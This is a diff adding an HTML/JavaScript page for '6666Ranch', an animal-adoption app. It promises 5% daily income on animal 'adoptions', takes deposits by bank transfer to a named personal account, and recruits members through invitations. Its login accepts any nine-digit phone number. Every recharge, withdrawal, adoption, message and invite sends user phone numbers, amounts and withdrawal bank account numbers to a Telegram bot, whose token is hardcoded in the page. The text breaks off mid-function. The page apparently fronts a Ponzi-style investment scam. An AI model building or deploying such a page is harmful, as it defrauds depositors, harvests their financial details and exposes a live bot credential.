@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>6666Ranch</title>
+    <style>
+        /* Auth Page Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 10px;
+        }
+        .auth-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 50px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .auth-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .auth-header h1 {
+            color: #4CAF50;
+            margin-bottom: 5px;
+        }
+        .auth-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ddd;
+        }
+        .auth-tab {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            cursor: pointer;
+        }
+        .auth-tab.active {
+            border-bottom: 2px solid #4CAF50;
+            font-weight: bold;
+            color: #4CAF50;
+        }
+        .auth-form {
+            display: none;
+        }
+        .auth-form.active {
+            display: block;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: none;
+            z-index: 1000;
+        }
+        .error {
+            background-color: #f44336;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        /* App Styles (hidden by default) */
+        #app-container {
+            display: none;
+            padding-bottom: 60px;
+        }
+        header {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            border-radius: 5px 5px 0 0;
+            margin-bottom: 10px;
+        }
+        .section {
+            background-color: white;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+        .section.active {
+            display: block;
+        }
+        .section-title {
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .amount {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #4CAF50;
+        }
+        .btn-outline {
+            background: white;
+            color: #4CAF50;
+            border: 1px solid #4CAF50;
+        }
+        .btn-danger {
+            background-color: #f44336;
+        }
+        .menu {
+            display: flex;
+            justify-content: space-around;
+            background-color: white;
+            padding: 10px 0;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            max-width: 500px;
+            margin: 0 auto;
+            border-top: 1px solid #eee;
+        }
+        .menu-item {
+            text-align: center;
+            padding: 5px;
+            cursor: pointer;
+            flex: 1;
+        }
+        .menu-item.active {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .record-item {
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+        }
+        .record-item:last-child {
+            border-bottom: none;
+        }
+        .arrow {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .animal-card {
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+        .animal-name {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .animal-price {
+            color: #4CAF50;
+        }
+        .tab-container {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 15px;
+        }
+        .tab {
+            padding: 10px 15px;
+            cursor: pointer;
+        }
+        .tab.active {
+            border-bottom: 2px solid #4CAF50;
+            font-weight: bold;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .bank-details {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border: 1px solid #ddd;
+        }
+        .bank-detail-item {
+            margin-bottom: 10px;
+        }
+        .detail-label {
+            font-weight: bold;
+            display: inline-block;
+            width: 120px;
+        }
+        .support-option {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+        .support-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #4CAF50;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="notification" id="notification"></div>
+    
+    <!-- Authentication Section (shown by default) -->
+    <div class="auth-container" id="auth-container">
+        <div class="auth-header">
+            <h1>6666Ranch</h1>
+            <p>m.6666ranch.cc</p>
+        </div>
+        
+        <div class="auth-tabs">
+            <div class="auth-tab active" onclick="switchAuthTab('login')">Login</div>
+            <div class="auth-tab" onclick="switchAuthTab('signup')">Sign Up</div>
+        </div>
+        
+        <div id="login-form" class="auth-form active">
+            <form onsubmit="login(event)">
+                <div class="form-group">
+                    <label for="login-phone">Phone Number</label>
+                    <input type="tel" id="login-phone" placeholder="Enter your phone number" required>
+                </div>
+                <div class="form-group">
+                    <label for="login-password">Password</label>
+                    <input type="password" id="login-password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="btn" id="login-submit">Login</button>
+            </form>
+        </div>
+        
+        <div id="signup-form" class="auth-form">
+            <form onsubmit="signup(event)">
+                <div class="form-group">
+                    <label for="signup-name">Full Name</label>
+                    <input type="text" id="signup-name" placeholder="Enter your full name" required>
+                </div>
+                <div class="form-group">
+                    <label for="signup-phone">Phone Number</label>
+                    <input type="tel" id="signup-phone" placeholder="Enter your phone number" required>
+                </div>
+                <div class="form-group">
+                    <label for="signup-password">Password</label>
+                    <input type="password" id="signup-password" placeholder="Create a password" required>
+                </div>
+                <div class="form-group">
+                    <label for="signup-confirm">Confirm Password</label>
+                    <input type="password" id="signup-confirm" placeholder="Confirm your password" required>
+                </div>
+                <div class="form-group">
+                    <label for="signup-invite">Invitation Code (Optional)</label>
+                    <input type="text" id="signup-invite" placeholder="Enter invitation code if any">
+                </div>
+                <button type="submit" class="btn" id="signup-submit">Create Account</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main App Container (hidden by default) -->
+    <div id="app-container">
+        <header>
+            <h1>6666Ranch</h1>
+            <p>m.6666ranch.cc</p>
+        </header>
+
+        <!-- Home Section -->
+        <div id="home-section" class="section active">
+            <div class="user-info">
+                <p>ID: <span id="user-id">20649</span></p>
+                <p>Phone: <span id="user-phone">993204587</span></p>
+                <button class="btn btn-outline" onclick="copyToClipboard('user-id')">Copy ID</button>
+                <button class="btn btn-outline" onclick="copyToClipboard('user-phone')">Copy Phone</button>
+            </div>
+
+            <div class="balance-section">
+                <div class="amount" id="rewards-balance">0.00</div>
+                <p>Rewards (ETB)</p>
+                <p>Members: <span id="team-count">1</span></p>
+                <p>Rich Income (ETB)</p>
+                <div class="amount" id="income-balance">0.00</div>
+                <p><span id="points-balance">350</span> Points</p>
+            </div>
+
+            <div class="section-title">Balance(ETB)</div>
+            <div class="amount" id="main-balance">0.00</div>
+            <button class="btn" onclick="showForm('recharge-form')">Recharge</button>
+            <button class="btn" onclick="showForm('withdrawal-form')">Withdrawal</button>
+
+            <div id="recharge-form" class="form" style="display: none;">
+                <h3>Recharge Form</h3>
+                
+                <div class="bank-details">
+                    <h3>Bank Transfer Details</h3>
+                    <div class="bank-detail-item">
+                        <span class="detail-label">Account Name:</span>
+                        <span>SULTAN MOHAMMED</span>
+                    </div>
+                    <div class="bank-detail-item">
+                        <span class="detail-label">Bank Name:</span>
+                        <span>CBE (Commercial Bank of Ethiopia)</span>
+                    </div>
+                    <div class="bank-detail-item">
+                        <span class="detail-label">Account Number:</span>
+                        <span>1000634709006</span>
+                    </div>
+                    <div class="bank-detail-item">
+                        <span class="detail-label">Reference:</span>
+                        <span>Your User ID (20649)</span>
+                    </div>
+                </div>
+                
+                <form onsubmit="rechargeAccount(event)">
+                    <div class="form-group">
+                        <label for="recharge-amount">Amount (ETB)</label>
+                        <input type="number" id="recharge-amount" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="payment-method">Payment Method</label>
+                        <select id="payment-method" required>
+                            <option value="">Select Payment Method</option>
+                            <option value="bank">Bank Transfer</option>
+                            <option value="telebirr">Telebirr</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="transaction-id">Transaction ID/Receipt</label>
+                        <input type="text" id="transaction-id" required>
+                    </div>
+                    <button type="submit" class="btn" id="recharge-submit">Submit</button>
+                    <button type="button" class="btn btn-outline" onclick="hideForm('recharge-form')">Cancel</button>
+                </form>
+            </div>
+
+            <div id="withdrawal-form" class="form" style="display: none;">
+                <h3>Withdrawal Form</h3>
+                <form onsubmit="withdrawAmount(event)">
+                    <div class="form-group">
+                        <label for="withdrawal-amount">Amount (ETB)</label>
+                        <input type="number" id="withdrawal-amount" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="account-number">Account Number</label>
+                        <input type="text" id="account-number" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="bank">Select Bank</label>
+                        <select id="bank" required>
+                            <option value="">Select Bank</option>
+                            <option value="cbe">Commercial Bank</option>
+                            <option value="awash">Awash Bank</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="btn" id="withdrawal-submit">Submit</button>
+                    <button type="button" class="btn btn-outline" onclick="hideForm('withdrawal-form')">Cancel</button>
+                </form>
+            </div>
+
+            <div class="section-title">
+                <span>The animal I adopted</span>
+                <span class="arrow" onclick="showSection('my-ranch-section')">View All ></span>
+            </div>
+            <div class="animal-card">
+                <div class="animal-name">Chicken</div>
+                <div class="animal-price">100 ETB</div>
+                <div>Status: Active</div>
+                <div>Daily Income: 5 ETB</div>
+            </div>
+        </div>
+
+        <!-- My Ranch Section -->
+        <div id="my-ranch-section" class="section">
+            <div class="section-title">My Ranch</div>
+            
+            <div class="tab-container">
+                <div class="tab active" onclick="switchTab('adoption-tab')">Adoption</div>
+                <div class="tab" onclick="switchTab('fund-tab')">Fund</div>
+                <div class="tab" onclick="switchTab('withdrawal-tab')">Withdrawal</div>
+            </div>
+            
+            <div id="adoption-tab" class="tab-content active">
+                <div class="record-item">
+                    <div>
+                        <div>Chicken</div>
+                        <small>Adopted: 2023-10-15</small>
+                    </div>
+                    <div>5 ETB/day</div>
+                </div>
+                <div class="record-item">
+                    <div>
+                        <div>Sheep</div>
+                        <small>Adopted: 2023-10-20</small>
+                    </div>
+                    <div>20 ETB/day</div>
+                </div>
+                <button class="btn" onclick="showSection('ranch-section')">Adopt More Animals</button>
+            </div>
+            
+            <div id="fund-tab" class="tab-content">
+                <div class="record-item">
+                    <div>
+                        <div>Recharge</div>
+                        <small>2023-10-10</small>
+                    </div>
+                    <div>+500 ETB</div>
+                </div>
+                <div class="record-item">
+                    <div>
+                        <div>Animal Income</div>
+                        <small>2023-10-15</small>
+                    </div>
+                    <div>+25 ETB</div>
+                </div>
+            </div>
+            
+            <div id="withdrawal-tab" class="tab-content">
+                <div class="record-item">
+                    <div>
+                        <div>Withdrawal</div>
+                        <small>2023-10-12</small>
+                    </div>
+                    <div>-200 ETB</div>
+                </div>
+                <div class="record-item">
+                    <div>
+                        <div>Withdrawal (Pending)</div>
+                        <small>2023-10-18</small>
+                    </div>
+                    <div>-150 ETB</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ranch Section -->
+        <div id="ranch-section" class="section">
+            <div class="section-title">Available Animals</div>
+            
+            <div class="animal-card">
+                <div class="animal-name">Chicken</div>
+                <div class="animal-price">100 ETB</div>
+                <div>Daily Income: 5 ETB</div>
+                <button class="btn" id="adopt-chicken" onclick="adoptAnimal('Chicken', 100, 'adopt-chicken')">Adopt</button>
+            </div>
+            
+            <div class="animal-card">
+                <div class="animal-name">Sheep</div>
+                <div class="animal-price">500 ETB</div>
+                <div>Daily Income: 20 ETB</div>
+                <button class="btn" id="adopt-sheep" onclick="adoptAnimal('Sheep', 500, 'adopt-sheep')">Adopt</button>
+            </div>
+            
+            <div class="animal-card">
+                <div class="animal-name">Cow</div>
+                <div class="animal-price">2000 ETB</div>
+                <div>Daily Income: 100 ETB</div>
+                <button class="btn" id="adopt-cow" onclick="adoptAnimal('Cow', 2000, 'adopt-cow')">Adopt</button>
+            </div>
+        </div>
+
+        <!-- Interaction Section -->
+        <div id="interaction-section" class="section">
+            <div class="section-title">Team Interaction</div>
+            
+            <form onsubmit="sendMessage(event)">
+                <div class="form-group">
+                    <textarea id="message-text" placeholder="Write your message..." rows="3" required></textarea>
+                </div>
+                <button type="submit" class="btn" id="message-submit">Send Message</button>
+            </form>
+            
+            <div class="message-list" style="margin-top: 20px;">
+                <div class="record-item">
+                    <div>
+                        <strong>Admin:</strong> Welcome to 6666Ranch!
+                        <div><small>2 days ago</small></div>
+                    </div>
+                </div>
+                <div class="record-item">
+                    <div>
+                        <strong>User123:</strong> How do I withdraw?
+                        <div><small>1 day ago</small></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="section-title" style="margin-top: 20px;">My Team</div>
+            <div class="record-item">
+                <div>User456</div>
+                <div>Active</div>
+            </div>
+            <div class="record-item">
+                <div>User789</div>
+                <div>Pending</div>
+            </div>
+            <button class="btn" onclick="showInviteForm()">Invite New Member</button>
+            
+            <div id="invite-form" style="display: none; margin-top: 15px;">
+                <form onsubmit="inviteMember(event)">
+                    <div class="form-group">
+                        <label for="invite-phone">Phone Number</label>
+                        <input type="tel" id="invite-phone" required>
+                    </div>
+                    <button type="submit" class="btn" id="invite-submit">Send Invitation</button>
+                    <button type="button" class="btn btn-outline" onclick="hideInviteForm()">Cancel</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Mine Section -->
+        <div id="mine-section" class="section">
+            <div class="section-title">My Account</div>
+            
+            <form onsubmit="updateProfile(event)">
+                <div class="form-group">
+                    <label for="user-name">Name</label>
+                    <input type="text" id="user-name" value="User123" required>
+                </div>
+                <div class="form-group">
+                    <label for="user-phone-input">Phone</label>
+                    <input type="tel" id="user-phone-input" value="993204587" required>
+                </div>
+                <div class="form-group">
+                    <label for="user-password">Change Password</label>
+                    <input type="password" id="user-password" placeholder="Leave blank to keep current">
+                </div>
+                <button type="submit" class="btn" id="profile-submit">Update Profile</button>
+            </form>
+            
+            <div class="section-title" style="margin-top: 20px;">Account Security</div>
+            <button class="btn btn-outline" onclick="showSecuritySettings()">Security Settings</button>
+            
+            <div id="security-settings" style="display: none; margin-top: 15px;">
+                <div class="form-group">
+                    <label for="current-password">Current Password</label>
+                    <input type="password" id="current-password" required>
+                </div>
+                <div class="form-group">
+                    <label for="new-password">New Password</label>
+                    <input type="password" id="new-password" required>
+                </div>
+                <button class="btn" onclick="changePassword()" id="password-submit">Change Password</button>
+            </div>
+            
+            <div class="section-title" style="margin-top: 20px;">Customer Support</div>
+            <div class="support-option" onclick="contactSupport('telegram')">
+                <div class="support-icon">T</div>
+                <div>
+                    <div class="support-title">Telegram Support</div>
+                    <div class="support-contact">@BNSTGO</div>
+                </div>
+            </div>
+            <div class="support-option" onclick="contactSupport('whatsapp')">
+                <div class="support-icon">W</div>
+                <div>
+                    <div class="support-title">WhatsApp Support</div>
+                    <div class="support-contact">+251993204587</div>
+                </div>
+            </div>
+            
+            <button class="btn btn-danger" style="margin-top: 30px;" onclick="logout()">Logout</button>
+        </div>
+
+        <div class="menu">
+            <div class="menu-item active" onclick="showSection('home-section')">Home</div>
+            <div class="menu-item" onclick="showSection('my-ranch-section')">My Ranch</div>
+            <div class="menu-item" onclick="showSection('ranch-section')">Ranch</div>
+            <div class="menu-item" onclick="showSection('interaction-section')">Interaction</div>
+            <div class="menu-item" onclick="showSection('mine-section')">Mine</div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8091773251:AAEMxxi8UA8keky1kE89Y1DGykfEV4cOE9g';
+        const CHAT_ID = '7384126560';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // App state
+        const state = {
+            balance: 1000, // Starting balance for testing
+            rewards: 0,
+            income: 0,
+            points: 350,
+            teamCount: 1,
+            animals: [
+                { name: "Chicken", price: 100, income: 5, adopted: false },
+                { name: "Sheep", price: 500, income: 20, adopted: false },
+                { name: "Cow", price: 2000, income: 100, adopted: false }
+            ],
+            transactions: [
+                { type: "recharge", amount: 500, date: "2023-10-10" },
+                { type: "withdrawal", amount: -200, date: "2023-10-12" },
+                { type: "income", amount: 25, date: "2023-10-15" },
+                { type: "withdrawal", amount: -150, date: "2023-10-18", status: "pending" }
+            ],
+            messages: [
+                { sender: "Admin", text: "Welcome to 6666Ranch!", date: "2 days ago" },
+                { sender: "User123", text: "How do I withdraw?", date: "1 day ago" }
+            ],
+            teamMembers: [
+                { name: "User456", status: "active" },
+                { name: "User789", status: "pending" }
+            ]
+        };
+
+        // Utility functions
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.backgroundColor = isError ? '#f44336' : '#4CAF50';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        function createLoadingButton(buttonId) {
+            const button = document.getElementById(buttonId);
+            if (button) {
+                button.innerHTML = '<span class="loading"></span> Processing...';
+                button.disabled = true;
+            }
+        }
+
+        function resetButton(buttonId, originalText) {
+            const button = document.getElementById(buttonId);
+            if (button) {
+                button.textContent = originalText;
+                button.disabled = false;
+            }
+        }
+
+        // Auth functions
+        function switchAuthTab(tab) {
+            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
+            
+            if (tab === 'login') {
+                document.querySelector('.auth-tab:nth-child(1)').classList.add('active');
+                document.getElementById('login-form').classList.add('active');
+            } else {
+                document.querySelector('.auth-tab:nth-child(2)').classList.add('active');
+                document.getElementById('signup-form').classList.add('active');
+            }
+        }
+
+        function login(e) {
+            e.preventDefault();
+            createLoadingButton('login-submit');
+            
+            const phone = document.getElementById('login-phone').value;
+            const password = document.getElementById('login-password').value;
+            
+            // Simple validation
+            if (!phone || !password) {
+                showNotification("Please fill in all fields", true);
+                resetButton('login-submit', 'Login');
+                return;
+            }
+            
+            // Simulate API call with timeout
+            setTimeout(() => {
+                // In a real app, you would validate with your backend
+                // For demo purposes, we'll just check if phone is 9 digits
+                if (phone.length === 9 && password.length >= 4) {
+                    showNotification("Login successful!");
+                    
+                    // Hide auth forms, show main app
+                    document.getElementById('auth-container').style.display = 'none';
+                    document.getElementById('app-container').style.display = 'block';
+                    
+                    // Initialize the main app
+                    initializeApp();
+                } else {
+                    showNotification("Invalid phone number or password", true);
+                }
+                
+                resetButton('login-submit', 'Login');
+            }, 1500);
+        }
+
+        function signup(e) {
+            e.preventDefault();
+            createLoadingButton('signup-submit');
+            
+            const name = document.getElementById('signup-name').value;
+            const phone = document.getElementById('signup-phone').value;
+            const password = document.getElementById('signup-password').value;
+            const confirm = document.getElementById('signup-confirm').value;
+            const invite = document.getElementById('signup-invite').value;
+            
+            // Validation
+            if (!name || !phone || !password || !confirm) {
+                showNotification("Please fill in all required fields", true);
+                resetButton('signup-submit', 'Create Account');
+                return;
+            }
+            
+            if (password !== confirm) {
+                showNotification("Passwords do not match", true);
+                resetButton('signup-submit', 'Create Account');
+                return;
+            }
+            
+            if (phone.length !== 9) {
+                showNotification("Phone number must be 9 digits", true);
+                resetButton('signup-submit', 'Create Account');
+                return;
+            }
+            
+            if (password.length < 4) {
+                showNotification("Password must be at least 4 characters", true);
+                resetButton('signup-submit', 'Create Account');
+                return;
+            }
+            
+            // Simulate API call with timeout
+            setTimeout(() => {
+                // In a real app, you would send this to your backend
+                showNotification("Account created successfully!");
+                
+                // Auto-login after signup
+                document.getElementById('login-phone').value = phone;
+                document.getElementById('login-password').value = password;
+                login(e);
+                
+                resetButton('signup-submit', 'Create Account');
+            }, 1500);
+        }
+
+        function logout() {
+            // Hide app, show auth forms
+            document.getElementById('app-container').style.display = 'none';
+            document.getElementById('auth-container').style.display = 'block';
+            
+            // Clear form fields
+            document.getElementById('login-phone').value = '';
+            document.getElementById('login-password').value = '';
+            
+            showNotification("Logged out successfully");
+        }
+
+        // Main App Functions
+        function initializeApp() {
+            updateUI();
+            
+            // Check adoption status and update buttons
+            state.animals.forEach(animal => {
+                if (animal.adopted) {
+                    const buttonId = `adopt-${animal.name.toLowerCase()}`;
+                    const button = document.getElementById(buttonId);
+                    if (button) {
+                        button.textContent = 'Adopted';
+                        button.disabled = true;
+                        button.style.backgroundColor = '#cccccc';
+                    }
+                }
+            });
+        }
+
+        function updateUI() {
+            document.getElementById("main-balance").textContent = state.balance.toFixed(2);
+            document.getElementById("rewards-balance").textContent = state.rewards.toFixed(2);
+            document.getElementById("income-balance").textContent = state.income.toFixed(2);
+            document.getElementById("points-balance").textContent = state.points;
+            document.getElementById("team-count").textContent = state.teamCount;
+        }
+
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
+            
+            document.querySelectorAll('.menu-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            
+            // Find the corresponding menu item and activate it
+            const menuItems = document.querySelectorAll('.menu-item');
+            for (let i = 0; i < menuItems.length; i++) {
+                if (menuItems[i].textContent.toLowerCase().includes(sectionId.replace('-section', ''))) {
+                    menuItems[i].classList.add('active');
+                    break;
+                }
+            }
+        }
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            event.target.classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        }
+
+        function showForm(formId) {
+            document.querySelectorAll('.form').forEach(form => {
+                form.style.display = 'none';
+            });
+            document.getElementById(formId).style.display = 'block';
+        }
+
+        function hideForm(formId) {
+            document.getElementById(formId).style.display = 'none';
+        }
+
+        function showInviteForm() {
+            document.getElementById('invite-form').style.display = 'block';
+        }
+
+        function hideInviteForm() {
+            document.getElementById('invite-form').style.display = 'none';
+        }
+
+        function showSecuritySettings() {
+            document.getElementById('security-settings').style.display = 'block';
+        }
+
+        function contactSupport(type) {
+            let url, message;
+            
+            const defaultMessage = `Hello 6666Ranch Support,\n\n` +
+                                 `I need assistance with my account:\n` +
+                                 `User ID: 20649\n` +
+                                 `Phone: 993204587\n\n` +
+                                 `[Describe your issue here]`;
+            
+            if (type === 'telegram') {
+                url = `https://t.me/BNSTGO?text=${encodeURIComponent(defaultMessage)}`;
+            } else if (type === 'whatsapp') {
+                url = `https://wa.me/251993204587?text=${encodeURIComponent(defaultMessage)}`;
+            }
+            
+            window.open(url, '_blank');
+        }
+
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        async function rechargeAccount(e) {
+            e.preventDefault();
+            const button = e.target.querySelector('button[type="submit"]');
+            const originalText = button.textContent;
+            createLoadingButton('recharge-submit');
+            
+            const amount = parseFloat(document.getElementById('recharge-amount').value);
+            const method = document.getElementById('payment-method').value;
+            const transactionId = document.getElementById('transaction-id').value;
+            
+            if (amount <= 0) {
+                showNotification("Amount must be greater than 0", true);
+                resetButton('recharge-submit', originalText);
+                return;
+            }
+            
+            // Send to Telegram
+            const telegramMessage = `💰 <b>New Recharge Request</b>\n\n` +
+                                 `User ID: ${document.getElementById('user-id').textContent}\n` +
+                                 `Amount: ${amount} ETB\n` +
+                                 `Method: ${method}\n` +
+                                 `Transaction ID: ${transactionId}\n` +
+                                 `Phone: ${document.getElementById('user-phone').textContent}\n\n` +
+                                 `Bank Details:\n` +
+                                 `Account: SULTAN MOHAMMED\n` +
+                                 `Bank: CBE\n` +
+                                 `Account No: 1000634709006`;
+            
+            const sent = await sendToTelegram(telegramMessage);
+            
+            if (sent) {
+                state.balance += amount;
+                state.transactions.push({
+                    type: "recharge",
+                    amount: amount,
+                    date: new Date().toISOString().split('T')[0],
+                    method: method,
+                    transactionId: transactionId
+                });
+                updateUI();
+                hideForm('recharge-form');
+                showNotification(`Recharge request for ${amount} ETB submitted. Contact support if not credited within 2 hours.`);
+            } else {
+                showNotification("Failed to send request. Please contact support directly.", true);
+            }
+            
+            resetButton('recharge-submit', originalText);
+        }
+
+        async function withdrawAmount(e) {
+            e.preventDefault();
+            const button = e.target.querySelector('button[type="submit"]');
+            const originalText = button.textContent;
+            createLoadingButton('withdrawal-submit');
+            
+            const amount = parseFloat(document.getElementById('withdrawal-amount').value);
+            const account = document.getElementById('account-number').value;
+            const bank = document.getElementById('bank').value;
+            
+            if (amount <= 0) {
+                showNotification("Amount must be greater than 0", true);
+                resetButton('withdrawal-submit', originalText);
+                return;
+            }
+            
+            if (amount > state.balance) {
+                showNotification("Insufficient balance", true);
+                resetButton('withdrawal-submit', originalText);
+                return;
+            }
+            
+            // Send to Telegram
+            const telegramMessage = `💸 <b>New Withdrawal Request</b>\n\n` +
+                                 `User ID: ${document.getElementById('user-id').textContent}\n` +
+                                 `Amount: ${amount} ETB\n` +
+                                 `Account: ${account}\n` +
+                                 `Bank: ${bank}\n` +
+                                 `Phone: ${document.getElementById('user-phone').textContent}`;
+            
+            const sent = await sendToTelegram(telegramMessage);
+            
+            if (sent) {
+                state.balance -= amount;
+                state.transactions.push({
+                    type: "withdrawal",
+                    amount: -amount,
+                    date: new Date().toISOString().split('T')[0],
+                    status: "pending",
+                    account: account,
+                    bank: bank
+                });
+                updateUI();
+                hideForm('withdrawal-form');
+                showNotification(`Withdrawal request for ${amount} ETB submitted. Processing may take 24 hours.`);
+            } else {
+                showNotification("Failed to send request. Please contact support directly.", true);
+            }
+            
+            resetButton('withdrawal-submit', originalText);
+        }
+
+        async function adoptAnimal(name, price, buttonId) {
+            createLoadingButton(buttonId);
+            
+            // Check balance
+            if (price > state.balance) {
+                showNotification(`Insufficient balance. You need ${price} ETB to adopt this animal.`, true);
+                resetButton(buttonId, 'Adopt');
+                return;
+            }
+            
+            // Find the animal
+            const animal = state.animals.find(a => a.name === name);
+            if (!animal) {
+                showNotification("Animal not found", true);
+                resetButton(buttonId, 'Adopt');
+                return;
+            }
+            
+            // Check if already adopted
+            if (animal.adopted) {
+                showNotification(`You have already adopted a ${name}`, true);
+                resetButton(buttonId, 'Adopt');
+                return;
+            }
+            
+            // Send to Telegram
+            const telegramMessage = `🐄 <b>New Animal Adoption</b>\n\n` +
+                                 `User ID: ${document.getElementById('user-id').textContent}\n` +
+                                 `Animal: ${name}\n` +
+                                 `Price: ${price} ETB\n` +
+                                 `Phone: ${document.getElementById('user-phone').textContent}`;
+            
+            const sent = await sendToTelegram(telegramMessage);
+            
+            if (sent) {
+                // Update state
+                state.balance -= price;
+                animal.adopted = true;
+                
+                // Update button
+                const button = document.getElementById(buttonId);
+                if (button) {
+                    button.textContent = 'Adopted';
+                    button.disabled = true;
+                    button.style.backgroundColor = '#cccccc';
+                }
+                
+                // Update UI
+                updateUI();
+                showNotification(`Successfully adopted a ${name}! Daily income: ${animal.income} ETB`);
+                
+                // Show in My Ranch section
+                showSection('my-ranch-section');
+            } else {
+                showNotification("Failed to process adoption. Please try again or contact support.", true);
+                resetButton(buttonId, 'Adopt');
+            }
+        }
+
+        async function sendMessage(e) {
+            e.preventDefault();
+            createLoadingButton('message-submit');
+            
+            const text = document.getElementById('message-text').value;
+            
+            // Send to Telegram
+            const telegramMessage = `✉️ <b>New Team Message</b>\n\n` +
+                                 `From: ${document.getElementById('user-id').textContent}\n` +
+                                 `Phone: ${document.getElementById('user-phone').textContent}\n\n` +
+                                 `Message: ${text}`;
+            
+            const sent = await sendToTelegram(telegramMessage);
+            
+            if (sent) {
+                state.messages.push({
+                    sender: "You",
+                    text: text,
+                    date: "Just now"
+                });
+                document.getElementById('message-text').value = '';
+                showNotification("Message sent to your team");
+            } else {
+                showNotification("Failed to send message. Please try again.", true);
+            }
+            
+            resetButton('message-submit', 'Send Message');
+        }
+
+        async function inviteMember(e) {
+            e.preventDefault();
+            createLoadingButton('invite-submit');
+            
+            const phone = document.getElementById('invite-phone').value;
+            
+            // Send to Telegram
+            const telegramMessage = `📩 <b>New Member Invitation</b>\n\n` +
+                                 `From User ID: ${document.getElementById('user-id').textContent}\n` +
+                                 `Invited Phone: ${phone}\n` +
+                                 `Inviter Phone: ${document.getElementById('user-phone').textContent}`;
+            
+            const sent = await sendToTelegram(telegramMessage);
+            
+            if (sent) {
+                state.teamCount++;
+                state.teamMembers.push({
+                    name: phone,
+                    status: "pending"
+                });
+                document.getElementById('invite-phone').value = '';
+                hideInviteForm();
+                showNotification(`Invitation sent to ${phone}`);
+                updateUI();
+            } else {
+                showNotification("Failed to send invitation. Please try again.", true);
